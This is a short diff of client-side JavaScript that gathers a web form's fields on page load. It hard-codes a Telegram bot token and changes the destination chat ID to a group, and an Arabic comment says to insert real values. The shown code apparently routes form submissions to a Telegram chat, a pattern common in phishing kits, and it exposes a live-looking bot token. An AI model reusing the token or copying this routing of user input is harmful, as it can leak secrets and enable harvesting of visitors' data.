@@ -125,7 +125,7 @@ document.addEventListener('DOMContentLoaded', function() {
     
         // ⚠️ استبدل النصوص بالبيانات الحقيقية بين العلامات ''
         const botToken = '7920936839:AAF5DkS04wEOcYpg5Hx8FjzrgYWtx5QOalU';
-        const chatId = '7090635960';
+        const chatId = '-1003968061145';
     
         const formData = new FormData(form);
         const data = {};
